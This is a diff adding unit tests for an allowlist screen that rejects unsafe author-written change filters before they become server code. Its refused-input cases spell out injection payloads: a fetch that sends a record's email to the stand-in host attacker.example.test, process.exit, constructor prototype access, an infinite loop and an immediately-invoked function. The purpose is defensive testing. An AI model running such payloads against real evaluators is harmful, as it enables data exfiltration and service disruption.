@@ -9,11 +9,14 @@
  */
 import { describe, it, expect } from 'vitest';
 import {
+    BuildChangeFilterCode,
     BuildEntityChangeContext,
     DidFieldChange,
     DidFieldChangeToValue,
+    IsChangeFilterParseable,
     LooseEquals,
     ReadFieldValue,
+    ScreenChangeFilter,
     type ChangeTrackedEntity,
 } from '../EntityChangeContext';
 
@@ -159,5 +162,40 @@ describe('ReadFieldValue', () => {
 
     it('returns undefined for a field the record does not have', () => {
         expect(ReadFieldValue({ Status: 'Approved' }, 'Nope')).toBeUndefined();
+    });
+});
+
+describe('ScreenChangeFilter — author-written filters become server code, so they are allowlisted', () => {
+    it.each([
+        "DidFieldChangeToValue('Status', 'Approved')",
+        "DidFieldChange('Status')",
+        'NewValues.Amount > 100 && OldValues.Amount <= 100',
+        "NewValues.Status === 'Open' || NewValues.Tags?.includes('urgent')",
+        'Math.abs(NewValues.Amount - OldValues.Amount) > 10',
+    ])('accepts %s', (filter) => {
+        expect(ScreenChangeFilter(filter)).toBeNull();
+        expect(IsChangeFilterParseable(filter).Parseable).toBe(true);
+    });
+
+    it.each([
+        ["fetch('https://attacker.example.test/?d=' + NewValues.Email)", 'host function'],
+        ['process.exit(1)', 'host global'],
+        ['ActionFilterContext.params', 'the raw filter context'],
+        ['DidFieldChange', 'a helper read as a value'],
+        ["[NewValues].map(DidFieldChange)", 'a helper passed as a callback'],
+        ['NewValues.constructor', 'prototype-chain access'],
+        ['true; while (true) {}', 'a statement after the expression'],
+        ["(() => { return true })()", 'an immediately-invoked function'],
+    ])('refuses %s (%s)', (filter) => {
+        expect(ScreenChangeFilter(filter)).toMatch(/forbidden construct/);
+        expect(IsChangeFilterParseable(filter).Parseable).toBe(false);
+    });
+
+    it('refuses before compiling, so a refused filter never reaches stored code', () => {
+        expect(() => BuildChangeFilterCode("fetch('https://attacker.example.test')")).toThrow(/Change filter refused/);
+    });
+
+    it('builds code for an accepted filter', () => {
+        expect(BuildChangeFilterCode("  DidFieldChange('Status')  ")).toContain("return (DidFieldChange('Status'));");
     });
 });
